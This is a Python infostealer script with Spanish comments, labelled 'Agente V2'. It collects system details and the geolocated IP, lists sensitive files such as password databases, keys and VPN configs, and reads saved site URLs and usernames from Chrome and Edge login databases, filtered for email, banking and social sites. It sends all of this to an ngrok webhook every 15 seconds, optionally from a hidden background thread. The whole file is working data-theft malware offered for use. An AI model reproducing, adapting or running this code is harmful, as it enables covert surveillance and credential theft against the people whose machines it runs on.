#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Agente V2 - Recoleccion pasiva + exfiltracion por webhook.
Lee logins guardados de Chrome y Edge (solo URLs y usuarios, no contrasenas).
Sin shell, sin subprocess, sin procesos hijos, sin captura de pantalla.
"""

import os
import json
import time
import socket
import sqlite3
import shutil
import platform
import datetime
import threading
import urllib.request
from pathlib import Path

# ===================== CONFIG =====================
WEBHOOK_URL = "https://abc123.ngrok-free.app/recibir"
TIMEOUT = 10
INTERVALO_SEG = 15

# URLs de interés: solo mandamos logins cuyo origin_url contenga algo de esto
FILTRO_URLS = [
    "google", "gmail", "youtube",
    "outlook", "hotmail", "live.com", "microsoft", "office",
    "yahoo", "protonmail", "mail",
    "facebook", "instagram", "twitter", "x.com", "tiktok",
    "whatsapp", "telegram", "linkedin",
    "mercadolibre", "mercadopago", "banco", "bank", "paypal",
    "afip", "arca", "anses",
    "github", "gitlab", "bitbucket",
    "amazon", "netflix", "spotify", "steam",
    "account", "login", "signin", "portal",
]

EXTENSIONES_INTERESANTES = {
    ".txt", ".pdf", ".docx", ".xlsx", ".csv",
    ".kdbx", ".ovpn", ".rdp", ".pem", ".key",
}
# ==================================================


# ---------- Capa 1: info del sistema ----------
def _ip_local() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "?"


def info_sistema() -> dict:
    return {
        "ts": datetime.datetime.now().isoformat(timespec="seconds"),
        "hostname": socket.gethostname(),
        "usuario": os.environ.get("USERNAME") or os.environ.get("USER") or "?",
        "so": f"{platform.system()} {platform.release()}",
        "arquitectura": platform.machine(),
        "python": platform.python_version(),
        "ip_local": _ip_local(),
    }


def geo_ip() -> dict:
    try:
        req = urllib.request.Request(
            "https://ipinfo.io/json",
            headers={"User-Agent": "Mozilla/5.0"},
        )
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return json.loads(r.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}


# ---------- Capa 2: listado de archivos ----------
def listar_archivos_interesantes(max_por_carpeta: int = 30) -> dict:
    home = Path.home()
    carpetas = ["Desktop", "Documents", "Downloads", "Pictures"]
    resultado = {}
    for nombre in carpetas:
        carpeta = home / nombre
        if not carpeta.exists():
            continue
        encontrados = []
        try:
            for f in carpeta.rglob("*"):
                if f.is_file() and f.suffix.lower() in EXTENSIONES_INTERESANTES:
                    try:
                        encontrados.append({
                            "nombre": f.name,
                            "ruta": str(f),
                            "tamano": f.stat().st_size,
                        })
                    except Exception:
                        continue
                if len(encontrados) >= max_por_carpeta:
                    break
        except Exception:
            continue
        if encontrados:
            resultado[nombre] = encontrados
    return resultado


# ---------- Capa 3: lectura de Login Data (Chrome / Edge) ----------
def _filtra_url(url: str) -> bool:
    """Devuelve True si la URL matchea algún filtro de interés."""
    if not url:
        return False
    u = url.lower()
    return any(f in u for f in FILTRO_URLS)


def _leer_login_data(ruta_perfil: str) -> list:
    """Copia Login Data a temp y extrae (url, usuario) filtrados."""
    db_original = os.path.join(ruta_perfil, "Login Data")
    if not os.path.exists(db_original):
        return []

    # Copiar a un temporal para no bloquear la DB original
    temp_db = os.path.join(
        os.environ.get("TEMP", "."),
        f"tmp_{os.getpid()}_{int(time.time())}.db"
    )
    try:
        shutil.copy2(db_original, temp_db)
    except Exception:
        return []

    resultados = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT origin_url, username_value FROM logins "
            "WHERE username_value != '' AND username_value IS NOT NULL"
        )
        for url, usuario in cursor.fetchall():
            if _filtra_url(url):
                resultados.append({
                    "url": url,
                    "usuario": usuario,
                })
        conn.close()
    except Exception:
        pass
    finally:
        try:
            if os.path.exists(temp_db):
                os.remove(temp_db)
        except Exception:
            pass

    return resultados


def leer_navegadores() -> dict:
    """Lee Chrome y Edge. Devuelve dict con las credenciales filtradas."""
    user = os.environ.get("USERPROFILE") or str(Path.home())
    rutas = {
        "chrome": os.path.join(user, r"AppData\Local\Google\Chrome\User Data\Default"),
        "edge": os.path.join(user, r"AppData\Local\Microsoft\Edge\User Data\Default"),
    }
    resultado = {}
    for nombre, ruta in rutas.items():
        logins = _leer_login_data(ruta)
        if logins:
            resultado[nombre] = logins
    return resultado


# ---------- Exfiltración ----------
def exfiltrar(payload: dict) -> str:
    try:
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return f"ok HTTP {r.status}"
    except Exception as e:
        return f"error: {e}"


# ---------- Ciclo principal ----------
def ciclo_agente():
    payload = {
        "sistema": info_sistema(),
        "geo": geo_ip(),
        "archivos": listar_archivos_interesantes(),
        "logins": leer_navegadores(),
    }
    return exfiltrar(payload)


def loop_agente():
    while True:
        try:
            resultado = ciclo_agente()
            print(f"[agente] {resultado}")
        except Exception as e:
            print(f"[agente] error: {e}")
        time.sleep(INTERVALO_SEG)


def iniciar_en_hilo():
    threading.Thread(target=loop_agente, daemon=True).start()


if __name__ == "__main__":
    print(ciclo_agente())
